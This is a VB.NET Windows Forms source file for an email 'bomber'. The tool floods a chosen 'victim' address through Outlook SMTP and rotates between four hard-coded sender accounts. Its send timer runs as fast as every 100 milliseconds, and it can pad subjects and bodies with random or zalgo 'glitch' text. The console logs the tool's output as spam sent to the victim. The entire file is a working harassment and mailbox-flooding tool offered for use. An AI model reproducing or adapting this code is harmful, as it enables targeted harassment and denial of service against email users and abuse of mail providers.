Imports System.Net
Imports System.Net.Mail
Imports System.Windows.Forms.VisualStyles.VisualStyleElement.Tab

Public Class BomberMain
    '# Form shadow 1
    Private Const CS_DROPSHADOW As Integer = 131073
    Protected Overrides ReadOnly Property CreateParams() As System.Windows.Forms.CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            cp.ClassStyle = cp.ClassStyle Or CS_DROPSHADOW
            Return cp
        End Get
    End Property

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        '# Form shadow 2
        Guna.UI.Lib.GraphicsHelper.ShadowForm(Me)


    End Sub


    Private Sub StartAnimBar_Tick(sender As Object, e As EventArgs) Handles StartAnimBar.Tick
        AnimationPanel.BackColor = ColorAnimValue.Value
    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
        Me.Close()
    End Sub


    Private Sub GunaButton1_Click(sender As Object, e As EventArgs) Handles GunaButton1.Click
        Dialog.ShowDialog()
    End Sub

    Private Sub Btn1_Click(sender As Object, e As EventArgs) Handles Btn1.Click

        Sending()


    End Sub


    Private Shared random As New Random()
    Public Shared Function GetRandom(ByVal length As Integer) As String
        Dim chars As String = "0123".ToUpper
        Return New String(Enumerable.Repeat(chars, length).Select(Function(s) s(random.Next(s.Length))).ToArray())
    End Function



    'DAta
    Dim server_email As String
    Dim server_pass As String

    Public Async Sub Sending()


        If sBox.SelectedIndex = 0 Then
            server_email = "edditproj1@outlook.com"
            server_pass = "YourPassword"
        End If

        If sBox.SelectedIndex = 1 Then
            server_email = "WielkiHam@outlook.com"
            server_pass = "YourPassword"
        End If

        If sBox.SelectedIndex = 2 Then
            server_email = "johsonPaulo@outlook.com"
            server_pass = "YourPassword"
        End If

        If sBox.SelectedIndex = 3 Then
            server_email = "technoamfia@outlook.com"
            server_pass = "YourPassword"
        End If



        Dim smtpClient As New SmtpClient("smtp-mail.outlook.com")
        smtpClient.Port = 587
        smtpClient.Credentials = New System.Net.NetworkCredential(server_email, server_pass)
        smtpClient.EnableSsl = True
        Dim mailMessage As New MailMessage()
        mailMessage.From = New MailAddress(server_email)
        mailMessage.To.Add(VictimText.Text)
        mailMessage.Subject = SubjectText.Text
        mailMessage.Body = BodyText.Text
        Try
            Await smtpClient.SendMailAsync(mailMessage)
            Success.Text += 1
            ConsoleWindow.Terminal.SelectionFont = New Font("Consolas", 9)
            ConsoleWindow.Terminal.SelectionColor = Color.Lime
            ConsoleWindow.Terminal.AppendText(vbNewLine & "[#] Sent spam to - " & VictimText.Text & " from server " & sBox.SelectedItem.ToString)
        Catch ex As Exception
            Failed.Text += 1
            ConsoleWindow.Terminal.SelectionFont = New Font("Consolas", 9)
            ConsoleWindow.Terminal.SelectionColor = Color.Red
            ConsoleWindow.Terminal.AppendText(vbNewLine & "[!!] Error with sending spam to - " & VictimText.Text & " from server " & sBox.SelectedItem.ToString & vbNewLine &
                                              "Full error output: [" & ex.Message & "]" & vbNewLine
                                              )
            ConsoleWindow.Terminal.SelectionFont = New Font("Consolas", 9, FontStyle.Underline)
            ConsoleWindow.Terminal.SelectionColor = Color.Gold
            ConsoleWindow.Terminal.AppendText(vbNewLine & "[!!!] Running again...")
            'SenderSpammer.Start()
            'Start.Text = "Start bombing"
        End Try
    End Sub


    Private Sub GunaElipsePanel6_Paint(sender As Object, e As PaintEventArgs) Handles GunaElipsePanel6.Paint

    End Sub

    Private Sub sBox_SelectedIndexChanged(sender As Object, e As EventArgs) Handles sBox.SelectedIndexChanged
    End Sub

    Private Sub RandomBox_CheckedChanged(sender As Object, e As EventArgs) Handles RandomBox.CheckedChanged
        If RandomBox.Checked = True Then
            RandomServer.Start()
        Else
            RandomServer.Stop()
        End If
    End Sub

    Private Sub RandomServer_Tick(sender As Object, e As EventArgs) Handles RandomServer.Tick
        Dim RespondFromRandom As Integer
        RespondFromRandom = GetRandom(1)
        sBox.SelectedIndex = RespondFromRandom
    End Sub

    Private Sub SenderSpammer_Tick(sender As Object, e As EventArgs) Handles SenderSpammer.Tick

        'Speed
        If SetSpeed.SelectedItem = "Low" Then
            SenderSpammer.Interval = 5000
        End If

        If SetSpeed.SelectedItem = "Normal" Then
            SenderSpammer.Interval = 3000
        End If

        If SetSpeed.SelectedItem = "High" Then
            SenderSpammer.Interval = 1500
        End If


        If SetSpeed.SelectedItem = "Medium" Then
            SenderSpammer.Interval = 1000
        End If

        If SetSpeed.SelectedItem = "Extreme" Then
            SenderSpammer.Interval = 100
        End If


        Sending()

    End Sub

    Private Sub Start_Click(sender As Object, e As EventArgs) Handles Start.Click
        If Start.Text = "Start bombing" Then
            Start.Text = "Stop bombing"
            Start.ForeColor = Color.Gold
            Start.BorderColor = Color.Gold
            ConsoleWindow.Show()
            ConsoleWindow.Terminal.SelectionFont = New Font("Consolas", 9)
            ConsoleWindow.Terminal.SelectionColor = Color.White
            ConsoleWindow.Terminal.AppendText(vbNewLine & "[#] Running spammer - Victim: " & VictimText.Text & " Speed: " & SetSpeed.SelectedItem & " [by discord: eddit]")

            SenderSpammer.Start()
        Else
            Start.Text = "Start bombing"
            Start.ForeColor = Color.Silver
            Start.BorderColor = Color.Gray

            ConsoleWindow.Terminal.SelectionFont = New Font("Consolas", 9)
            ConsoleWindow.Terminal.SelectionColor = Color.White
            ConsoleWindow.Terminal.AppendText(vbNewLine & "[#] Closing spammer • may be delayed")
            SenderSpammer.Stop()
        End If
    End Sub



    '# Random Subject Strings:

    Private Shared randomSubject As New Random()
    Public Shared Function GetRandomSubject(ByVal length As Integer) As String
        Dim chars As String = "123456789asdfghjklzxcvbnmqwertyuiopASDFGHJKLZXCVBNMQWERTYUIOP"
        Return New String(Enumerable.Repeat(chars, length).Select(Function(s) s(random.Next(s.Length))).ToArray())
    End Function

    Private Shared randomBody As New Random()
    Public Shared Function GetRandomBody(ByVal length As Integer) As String
        Dim chars As String = "123456789asdfghjklzxcvbnmqwertyuiopASDFGHJKLZXCVBNMQWERTYUIOP"
        Return New String(Enumerable.Repeat(chars, length).Select(Function(s) s(random.Next(s.Length))).ToArray())
    End Function


    Private Sub GunaButton2_Click(sender As Object, e As EventArgs) Handles RandomSubjectBtn.Click
        If RandomSubjectBtn.Text = "Start" Then
            RandomSubjectBtn.Text = "Stop"
            RandomSubjectTimer.Start()
        Else
            RandomSubjectBtn.Text = "Start"
            RandomSubjectTimer.Stop()
        End If
    End Sub

    Private Sub RandomSubjectTimer_Tick(sender As Object, e As EventArgs) Handles RandomSubjectTimer.Tick
        If AddNewText.Checked = True Then
            SubjectText.Text = GetRandomSubject(70)
        End If

        If AddExistingText.Checked = True Then
            SubjectText.Text = SubjectText.Text & GetRandomSubject(70)
        End If
    End Sub

    Private Sub RandomBodyTimer_Tick(sender As Object, e As EventArgs) Handles RandomBodyTimer.Tick
        If AddNewTextBody.Checked = True Then
            BodyText.Text = GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500) &
                vbNewLine & GetRandomBody(500) & vbNewLine & GetRandomBody(500)
        End If
        If AddExistingTextBody.Checked = True Then
            BodyText.Text = BodyText.Text & GetRandomBody(1000) & vbNewLine & GetRandomBody(1000) & vbNewLine &
                GetRandomBody(1000) & vbNewLine & GetRandomBody(1000)
        End If
    End Sub

    Private Sub RandomBodyBtn_Click(sender As Object, e As EventArgs) Handles RandomBodyBtn.Click
        If RandomBodyBtn.Text = "Start" Then
            RandomBodyBtn.Text = "Stop"
            RandomBodyTimer.Start()
        Else
            RandomBodyBtn.Text = "Start"
            RandomBodyTimer.Stop()
        End If
    End Sub

    Private Sub SetSpeed_SelectedIndexChanged(sender As Object, e As EventArgs) Handles SetSpeed.SelectedIndexChanged

    End Sub



    Private Shared randomSubjectGlitchText As New Random()
    Public Shared Function GetRandomSubjectGlitch(ByVal length As Integer) As String
        Dim chars As String = "ȃ̴̧̠̮̰̺̙̞̒͑̔̊͂̓͊̒̃͋͐͊̔͌́͝_̊̀͐".ToString
        Return New String(Enumerable.Repeat(chars, length).Select(Function(s) s(random.Next(s.Length))).ToArray())
    End Function


    Private Shared randomBodyGlitchText As New Random()
    Public Shared Function GetRandomBodyGlitch(ByVal length As Integer) As String
        Dim chars As String = "ȃ̴̧̠̮̰̺̙̞̒͑̔̊͂̓͊̒̃͋͐͊̔͌́͝_̊̀͐⫣a͞⊫ⱥ⌌Ⓐ̙⌏
ꁲa͛⦚a͛⦚ɒ҉༙྇ ɒ҉༙྇ 𝗮̘̚".ToString
        Return New String(Enumerable.Repeat(chars, length).Select(Function(s) s(random.Next(s.Length))).ToArray())
    End Function





    Private Sub RandomSubjectGlitch_Tick(sender As Object, e As EventArgs) Handles RandomSubjectGlitch.Tick
        SubjectText.Text = GetRandomSubjectGlitch(3)
    End Sub

    Private Sub GlitchStartBtn_Click(sender As Object, e As EventArgs) Handles GlitchStartBtn.Click
        If GlitchStartBtn.Text = "Start" Then
            GlitchStartBtn.Text = "Stop"
            RandomSubjectGlitch.Start()
        Else
            GlitchStartBtn.Text = "Start"
            RandomSubjectGlitch.Stop()
        End If
    End Sub

    Private Sub GunaButton2_Click_1(sender As Object, e As EventArgs) Handles GunaButton2.Click
        If GunaButton2.Text = "Start" Then
            GunaButton2.Text = "Stop"
            RandomBodyGlitch.Start()
        Else
            GunaButton2.Text = "Start"
            RandomBodyGlitch.Stop()
        End If
    End Sub

    Private Sub RandomBodyGlitch_Tick(sender As Object, e As EventArgs) Handles RandomBodyGlitch.Tick
        BodyText.Text = GetRandomBodyGlitch(4)
    End Sub

    Private Sub StopCheck_Tick(sender As Object, e As EventArgs) Handles StopCheck.Tick
        If Start.Text = "Start bombing" Then
            SenderSpammer.Stop()
        End If
    End Sub

    Private Sub ShowConsoleBtn_Click(sender As Object, e As EventArgs) Handles ShowConsoleBtn.Click
        ConsoleWindow.Show()
    End Sub

    Private Sub GunaElipsePanel2_Paint(sender As Object, e As PaintEventArgs) Handles GunaElipsePanel2.Paint

    End Sub
End Class
